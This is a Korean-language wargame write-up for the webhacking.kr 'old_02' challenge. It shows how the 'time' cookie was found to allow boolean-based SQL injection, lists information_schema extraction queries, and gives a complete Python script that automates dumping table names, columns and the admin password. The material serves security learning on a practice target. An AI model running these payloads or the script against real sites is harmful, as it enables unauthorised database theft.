## old_02

![vmware_WWvlGzR1z0](https://user-images.githubusercontent.com/79683414/142334224-11fd6d90-215e-422f-9b0b-0a02034d3036.png)

```html
<!--
2021-11-18 10:26:21
-->
<h2>Restricted area</h2>Hello stranger. Your IP is logging...
<!-- if you access admin.php i will kick your ass -->
```

<br>

<br>

_admin.php_

![vmware_SBpAYYz30J](https://user-images.githubusercontent.com/79683414/142334451-d13ff3bb-ebfc-421a-9eba-bc0358d126f8.png)



<br>

admin.php 에서는 POST 로 패스워드를 보내는 형식이다. 스크립트 태그와 SQL 인젝션을 테스트 했지만 취약점이 확인되지 않았다.

처음엔 아무렇지 않게 넘겼지만, Redirected area에 수상한 점이 있다.

접속한 시간대가 표시되고 있다.

<br>

![vmware_ZLUwU7DfDd](https://user-images.githubusercontent.com/79683414/142334941-8c6bb4d1-c434-47b4-9493-8da4c185a2d3.png)

<br>

Burpsuite 로 패킷을 분석해보았다.

<br>

![vmware_m5widKW9CY](https://user-images.githubusercontent.com/79683414/142335166-a812960d-df6c-41a7-9975-c532639f68ac.png)

<br>

현재 시간을 받아와서 어떤 변환을 거쳐 Cookie: time 값으로 세팅되는 듯 한데,

어떤 식으로 동작하는지, Repeater를 이용해 여러 값을 테스트했다.

<br>

![vmware_hfrQtFlNnP](https://user-images.githubusercontent.com/79683414/142336093-e53e7160-8eef-44fb-a43c-95a01a4987d4.png)

![vmware_lKW7RKOAOi](https://user-images.githubusercontent.com/79683414/142336050-528f0e7c-8315-4013-978a-bd1050550a0f.png)

![vmware_gisBhzKPZy](https://user-images.githubusercontent.com/79683414/142336211-91c42e43-2ee4-412b-8186-889c18a6eebf.png)

![vmware_XGn6C0sYXv](https://user-images.githubusercontent.com/79683414/142336229-2a33661d-e121-466b-be21-8fc172802dea.png)<br>

time=0 인 경우, 값이 다시 세팅되 버린다.

1, 2, 123 을 대입했을 때의 결과를 보면, 정수값을 '분/초' 로 변환하고 있다는 것을 알 수 있다.

여기도 스크립트나 SQL 을 테스트 해 보자.

<br>

![vmware_DrmXgJiXex](https://user-images.githubusercontent.com/79683414/142337192-43a362bb-a3fe-48e2-9ed1-4e2a0fbe8b4d.png)

![vmware_wYjdCNgcBe](https://user-images.githubusercontent.com/79683414/142338611-9c710c54-3da8-432d-a881-c87498f61378.png)
![vmware_IAVe1qM20n](https://user-images.githubusercontent.com/79683414/142338614-74f2cb7a-c51b-4dc5-babb-551d9f841c92.png)

<br>

추측해보면, time 의 값이 참이면 해당되는 정수값을 시간으로 변환하여 출력하는 듯 하다. 따라서, Boolean-Based SQL Injection 이 가능하다.

<br>

information_schema 를 이용하여 `개수 > 길이 > 이름` 순으로 데이터를 추출했다.

SQL 문은 `( )` 로 감싸주지 않으면 의도한 결과를 출력하지 않는다.

1. 테이블 개수 : select count(table_name) from information_schema.tables where table_schema=database()

2. 테이블 이름 길이 : select length(table_name) from information_schema.tables where table_schema=database() limit 0,1

3.테이블 이름: select ascii(substring(table_name, 1, 1)) from information_schema.tables where table_schema=database() limit 0,1

<br>

![vmware_5tpZLzuthy](https://user-images.githubusercontent.com/79683414/142339222-9cabb5fa-5167-4f84-94ad-dd4914ebe8ef.png)

사용중인 Database에는 2개의 테이블이 있고,

<br>

![vmware_mH7o1ECqiZ](https://user-images.githubusercontent.com/79683414/142340121-83993c15-2bbe-46b6-8d2d-882fd119ef5d.png)

첫 번째 테이블명의 길이는 13 이다.

<br>

![vmware_8f6TRx7oYT](https://user-images.githubusercontent.com/79683414/142340324-bfdc7379-3423-487c-9cb0-f206250443b5.png)

<br>

substring 을 이용해 문자 하나를 추출하고, 참인 정수값만 그대로 출력되기 때문에

ascii()를 이용한다. substring은 limit 와 다르게 index가 0 부터 시작한다.

나머지 과정은 아래와 같다.

<br>

- 컬럼 개수 : select count(column_name) from information_schema.columns where table_name="admin_area_pw"

- 컬럼 이름 길이: select length(column_name) from information_schema.columns where table_name="admin_area_pw" limit 0,1

- 컬럼 이름 : select ascii(substring(column_name, 1, 1)) from information_schema.columns where table_name="admin_area_pw" limit 0,1



_패스워드_

- select count(pw) from admin_area_pw

- select length(pw) from admin_area_pw limit 0,1

- select ascii(substring(pw, 1,1)) from admin_area_pw limit 0,1

<br>

이를 파이썬 코드로 자동화 해봤다.

<details>
    <summary>Python Code</summary>

```python
import urllib.request

sid = ""	# 세션 ID 값
cookie = "time=({});PHPSESSID=" + sid
pre = {
    "count": "select count({}) from {} where {}",
    "len": "select length({}) from {} where {} limit {},1",
    "data": "select ascii(substring({}, 1)) from {} where {} limit {},1"
}


# 쿼리문 수행
def inject(query):
    url = "https://webhacking.kr/challenge/web-02/"
    req = urllib.request.Request(url)
    req.add_header("Cookie", cookie.format(query))
    res = urllib.request.urlopen(req)
    read = str(res.read().decode("utf-8")).split()
    time = list(map(lambda x: int(x), read[2].split(":")))
    return (60 * time[1]) + time[2]


# 데이터 개수 -> 각 데이터 길이 -> 한 글자씩 데이터 추출
def get_data(column, table, where):
    result = {}
    query = pre["count"].format(column, table, where)
    cnt = inject(query)
    print(query)
    print(cnt)
    if cnt > 20:
        return "Unavailable"
    for i in range(cnt):
        data = ""
        query = pre["len"].format(column, table, where, i)
        length = inject(query)
        print(query)
        print(length)
        # limit은 첫 인덱스가 0, substirng 은 1부터 시작이다...
        for j in range(1, length+1):
            query = pre["data"].format(column + "," + str(j), table, where, i)
            data += chr(inject(query))
            print(query)
            print(data)
        if where == "true":
            return data
        result[data] = {}
    return result


def get_tables():
    tables = get_data("table_name", "information_schema.tables", "table_schema=database()")
    for table in tables.keys():
        tables[table] = get_data("column_name", "information_schema.columns", "table_name=\"{}\"".format(table))
    return tables


def start_injection():
    tables = get_tables()
    print("[tables]")
    print(tables)
    for table in tables.keys():
        for col in tables[table]:
            data = get_data(col, table, "true")
            tables[table][col] = data
    print(tables)


if __name__ == "__main__":
    start_injection()

```

<br>

![pycharm64_mwTBEejV4T](https://user-images.githubusercontent.com/79683414/142340964-65bbf262-0948-4690-b756-83480feecb13.png)

</details>

